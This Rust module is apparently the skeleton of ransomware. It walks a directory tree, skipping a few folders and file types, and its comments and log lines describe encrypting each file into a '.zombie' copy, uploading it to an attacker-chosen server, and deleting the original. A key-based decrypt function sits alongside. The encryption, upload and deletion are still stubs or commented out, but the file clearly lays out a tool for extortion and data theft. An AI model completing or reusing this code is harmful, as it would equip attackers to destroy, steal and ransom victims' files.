//! A module for recursively walking a directory tree, processing
//! files (encrypt, decrypt, exfiltrate), and deleting original files.

use log::info;
use std::collections::HashSet;
// use std::fs;
use std::io;
use std::path::PathBuf;
use walkdir::WalkDir;

// use crate::crypto;

// Rust lifetimes make me wanna cry--pun intended
// Slices are used to avoid informing the number of elements of an array
// Avoiding Vec for better performance, no dynamic allocation--heap
/// Permanent, read-only lists that contain permanent, read-only string references
const EXCLUDED_DIRS: &'static [&'static str] = &[".git", "bin", ".cache"];
const EXCLUDED_FILES: &'static [&'static str] = &[".dmg", ".tmp", ".DS_Store"];

/// Walks a directory tree starting from `path`, excluding directories
/// and files based on predefined lists, and encrypts and exfiltrates
/// files.
///
/// # Arguments
/// - `path`: Starting directory as a `PathBuf`
/// - `no_delete`: Boolean flag: false means the original file is deleted
/// - `server`: String representing the target server
/// - `target_folder`: Option<String> for a specific folder on the server
///
/// # Logic
/// Uses `HashSet` for efficient lookups of excluded names.
/// Iterates through the file system, and for each valid file:
///   - Encrypts the file generating a `.zombie` version
///   - Sends the encrypted file to the target server
///   - Optinally, deletes the original file locally
pub fn encrypt(
    path: PathBuf,
    no_delete: bool,
    server: String,
    target_folder: Option<String>,
) -> Result<(), io::Error> {
    if !path.exists() {
        return Err(io::Error::new(
            io::ErrorKind::NotFound,
            "Path does not exist",
        ));
    }
    let excluded_dirs_set: HashSet<&str> = EXCLUDED_DIRS.iter().cloned().collect();
    let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();

    // Takes a path and creates a lazy iterator that traverses the directory
    // tree--only scans the file system as needed.
    // As it finds each file/folder, it immediately applies a filter to check
    // if the item's name should be excluded--see the exclusion lists.
    let walker = WalkDir::new(&path).into_iter().filter_entry(|entry| {
        let file_name = entry.file_name();
        let file_path = entry.path();

        if entry.file_type().is_dir() {
            if let Some(file_name) = file_name.to_str() {
                if excluded_dirs_set.contains(file_name) {
                    info!("Skipping folder {}", file_path.display());
                    return false;
                }
            }
        }

        if entry.file_type().is_file() {
            let path = entry.path();
            let file_name_str = path.file_name().and_then(|name| name.to_str());
            let extension_str = path
                .extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| format!(".{}", ext));

            if file_name_str.map_or(false, |name| excluded_files_set.contains(name))
                || extension_str.map_or(false, |ext| excluded_files_set.contains(ext.as_str()))
            {
                info!("Skipping file {}", file_path.display());
                return false;
            }
        }
        true // entry wasn't excluded, so it'll be processed
    });

    // This loop consumes the walker iterator and as the loop progresses,
    // it asks for the next item from the iterator--this request triggers
    // the iterator to scan the file system!
    // The iterator will automatically suppress undesirable files or folders.
    info!("Encryption starting at {}", path.display());
    for entry in walker.filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            let file_path = entry.path();

            // Encrypt enters here
            info!("Encrypting file {}", file_path.display());
            // Checks output and logs zombie file created or not

            if !no_delete {
                info!("Deleting original file {}", file_path.display());
                // fs::remove_file(file_path)?;
            }

            let action_message = format!("Upload {} to server {}", file_path.display(), server);
            if let Some(folder) = &target_folder {
                info!("{}, target folder {}", action_message, folder);
            } else {
                info!("{}", action_message);
            }
        }
    }
    info!("Encryption finished for path {}", path.display());
    Ok(())
}

pub fn decrypt(path: PathBuf, key: PathBuf) -> Result<(), io::Error> {
    info!(
        "Decryption started. Path: {}, Key: {}",
        path.display(),
        key.display()
    );
    // tests, like key exists? path is valid?
    // magic
    info!("Decryption finished successfully");
    Ok(())
}
